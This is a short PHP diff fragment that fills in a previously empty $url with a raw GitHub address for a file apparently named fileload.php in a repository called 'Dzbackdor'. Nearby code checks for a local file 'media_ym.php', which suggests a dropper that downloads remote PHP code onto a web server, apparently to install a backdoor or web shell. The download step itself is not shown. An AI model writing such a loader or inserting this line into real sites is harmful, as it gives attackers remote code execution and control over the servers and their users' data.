@@ -4,7 +4,7 @@
 
 $tmp = 'media_ym.php';
 
-$url = '';
+$url = 'https://raw.githubusercontent.com/Dzbackdor/anonymous/refs/heads/main/void/mini/fileload.php';
 
 if (!file_exists($tmp) || filesize($tmp) < 10) {
 
